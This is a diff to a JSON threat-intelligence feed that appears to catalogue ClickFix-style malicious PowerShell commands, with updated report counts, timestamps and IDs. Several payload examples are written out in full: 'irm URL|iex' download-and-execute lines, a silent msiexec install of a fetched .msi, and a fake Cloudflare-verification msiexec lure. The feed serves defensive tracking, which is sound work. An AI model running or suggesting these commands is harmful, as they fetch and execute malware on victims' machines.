@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 153,
-    "ReportCount": 153,
+    "DistinctPayloadCount": 155,
+    "ReportCount": 155,
     "FirstSeen": "2026-11-10T09:55:19.073000+00:00",
-    "LastSeen": "2026-11-16T22:39:15.023000+00:00",
+    "LastSeen": "2026-11-17T04:24:31.208000+00:00",
     "ReportIds": [
       "cmwaikzu608q10omllivblirh",
       "cmwaila5l08ql0omlduekey7c",
@@ -158,7 +158,9 @@
       "cmwjgjbds18760omlye859nvq",
       "cmwjgtb3118ia0omlurpyuw41",
       "cmwjkxoi218tj0omlrq3g2ch1",
-      "cmwjuij2u191f0oml5k180wgd"
+      "cmwjuij2u191f0oml5k180wgd",
+      "cmwk6k4pd1avk0omlczwcm3rd",
+      "cmwk6ujt41baj0oml14o237b2"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/013ce88bf8a96d89'|iex;",
@@ -220,6 +222,7 @@
       "irm 'browse-cloud.codes/df566b6947c2c0cc'|iex;",
       "irm 'browse-cloud.codes/e058fa21b0d6398a'|iex;",
       "irm 'browse-cloud.codes/e0d5e1e484132468'|iex;",
+      "irm 'browse-cloud.codes/e0f86137ef78e8ec'|iex;",
       "irm 'browse-cloud.codes/e1b66155c1796380'|iex;",
       "irm 'browse-cloud.codes/e2a70f128e088e5a'|iex;",
       "irm 'browse-cloud.codes/ea55171f930bd17a'|iex;",
@@ -230,6 +233,7 @@
       "irm 'browse-cloud.codes/f141a3fc3b742e21'|iex;",
       "irm 'browse-cloud.codes/f19c44dcc955c4eb'|iex;",
       "irm 'browse-cloud.codes/f7ed5df838d3e4b9'|iex;",
+      "irm 'browse-cloud.codes/fa625dfc6bcfb436'|iex;",
       "irm 'browse-cloud.codes/fe2aab3b32968bba'|iex;",
       "irm 'browse-nnccodes.beer/01b5a3d4cceef7ae'|iex;",
       "irm 'browse-nnccodes.beer/02275e4ee7b11819'|iex;",
@@ -531,9 +535,9 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 15,
-    "ReportCount": 145,
+    "ReportCount": 150,
     "FirstSeen": "2026-11-10T13:31:52.884000+00:00",
-    "LastSeen": "2026-11-16T23:20:19.248000+00:00",
+    "LastSeen": "2026-11-17T04:16:08.643000+00:00",
     "ReportIds": [
       "cmwaqbhyx022q0oml78i982wh",
       "cmwaqfk6e027u0omlrrf8nufh",
@@ -679,7 +683,12 @@
       "cmwitstsl15m00omlpia4l632",
       "cmwj2p67u16ef0oml8gvz64x2",
       "cmwjky1uy18u30oml4osuzwws",
-      "cmwjvzcgx19280omlttmi8ydj"
+      "cmwjvzcgx19280omlttmi8ydj",
+      "cmwk6gsan1akk0oml325oec4f",
+      "cmwk6he431amb0omloev2qrcj",
+      "cmwk6hq8x1ap40omlnmflpsa2",
+      "cmwk6hw231aqb0omlyr9ew0ye",
+      "cmwk6js0k1at90omloc5rplsj"
     ],
     "PayloadExamples": [
       "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
@@ -908,9 +917,9 @@
   {
     "Pattern": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"<URL>\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 27,
+    "ReportCount": 28,
     "FirstSeen": "2026-11-11T21:03:56.705000+00:00",
-    "LastSeen": "2026-11-15T00:42:40.551000+00:00",
+    "LastSeen": "2026-11-17T04:15:01.195000+00:00",
     "ReportIds": [
       "cmwclwpgw0a210omltnipi6za",
       "cmwczsy7h0fjp0omltp7h00pn",
@@ -938,7 +947,8 @@
       "cmwfpywm20ikw0omloshmzs1c",
       "cmwgmq76i0lru0omlkr8mx6sp",
       "cmwgs7swd0lxo0oml3ahm9x1b",
-      "cmwh41jw00nhv0omlq5rsqtp4"
+      "cmwh41jw00nhv0omlq5rsqtp4",
+      "cmwk6ibyh1asd0omlequtdloh"
     ],
     "PayloadExamples": [
       "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit"
@@ -1000,6 +1010,20 @@
     ],
     "PayloadExamples": [
       "msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiex...\n...ps://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ Verif...\nFake"
+    ]
+  },
+  {
+    "Pattern": "Invoke-WebRequest \"<URL>\" -OutFile $z",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 2,
+    "FirstSeen": "2026-11-16T04:29:43.499000+00:00",
+    "LastSeen": "2026-11-17T04:11:57.901000+00:00",
+    "ReportIds": [
+      "cmwirle2v12n40omld3oq13mn",
+      "cmwk6eeiu1ajo0omlb9q6d1o1"
+    ],
+    "PayloadExamples": [
+      "Invoke-WebRequest \"https://swingerwives[.]com\" -OutFile $z"
     ]
   },
   {
@@ -1078,19 +1102,6 @@
     ],
     "PayloadExamples": [
       "ClickFix Win+R instruction: ...43a4-B972-7b11871881A1 | IEX IRM gitlab[.]com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/07684D2-7E68-43a4-B972-7b11871881A1 | IEX Press Windows Key + X Ctrl + V..."
-    ]
-  },
-  {
-    "Pattern": "Invoke-WebRequest \"<URL>\" -OutFile $z",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-16T04:29:43.499000+00:00",
-    "LastSeen": "2026-11-16T04:29:43.499000+00:00",
-    "ReportIds": [
-      "cmwirle2v12n40omld3oq13mn"
-    ],
-    "PayloadExamples": [
-      "Invoke-WebRequest \"https://swingerwives[.]com\" -OutFile $z"
     ]
   },
   {
